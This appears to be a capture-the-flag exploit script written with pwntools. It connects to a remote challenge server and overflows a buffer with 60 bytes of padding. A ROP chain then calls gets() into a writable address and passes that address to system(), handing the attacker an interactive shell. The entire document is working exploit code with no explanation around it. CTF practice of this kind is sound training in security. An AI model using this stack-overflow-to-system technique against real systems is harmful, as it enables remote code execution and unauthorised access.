from pwn import *

elf = context.binary = ELF('./server')
context.log_level = 'debug'

p = remote('thekidofarcrania.com', 4902)

writable = 0x804a030
offset = 60

rop = ROP(elf)
rop.raw(b'A' * offset)
rop.call(elf.plt.gets, [writable])
rop.call(elf.plt.system, [writable])

p.sendline(rop.chain())
p.interactive()
